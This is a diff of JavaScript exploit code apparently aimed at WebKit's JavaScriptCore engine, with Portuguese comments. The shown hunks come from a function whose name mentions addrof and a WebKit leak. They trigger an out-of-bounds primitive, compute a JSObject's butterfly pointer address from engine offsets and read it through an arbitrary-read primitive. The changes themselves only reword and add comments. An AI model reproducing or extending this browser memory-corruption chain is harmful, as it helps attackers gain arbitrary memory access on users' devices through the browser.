@@ -45,7 +45,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let final_result = { success: false, message: "A cadeia de L/E Arbitrária não obteve sucesso." };
 
     try {
-        // --- FASE 1: Obtendo primitiva OOB ---
+        // --- FASE 1: Obtenção de primitiva OOB ---
         logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
@@ -73,10 +73,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Endereço do 'rw_driver_array' (molde): ${rw_driver_addr.toString(true)}`, "info");
 
         // **CORREÇÃO CRÍTICA**: Ler o ponteiro do butterfly no offset correto.
+        // 1. Calcula o endereço do CAMPO que contém o ponteiro para o butterfly.
         const butterfly_ptr_addr = new AdvancedInt64(
             rw_driver_addr.low() + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET,
             rw_driver_addr.high()
         );
+        // 2. Lê o valor nesse campo para obter o endereço REAL do butterfly.
         const original_butterfly_addr = await arb_read(butterfly_ptr_addr, 8);
         if (original_butterfly_addr.equals(0)) {
             throw new Error("Falha ao ler o endereço do butterfly. O endereço retornado é nulo.");
